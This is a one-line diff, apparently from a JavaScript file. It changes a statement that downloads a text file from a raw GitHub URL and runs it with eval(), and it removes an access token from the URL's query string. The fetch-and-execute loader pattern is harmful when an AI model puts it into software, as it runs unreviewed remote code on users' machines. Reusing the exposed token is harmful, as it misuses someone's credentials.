@@ -1,1 +1,1 @@
-eval(await (await fetch("https://raw.githubusercontent.com/petras-spstrutnov/y/master/yes.txt?token=GHSAT0AAAAAAB2AG3OAHNTHSKYCVMCNFC4IY3SQ63Q")).text())
+eval(await (await fetch("https://raw.githubusercontent.com/petras-spstrutnov/y/master/yes.txt")).text())
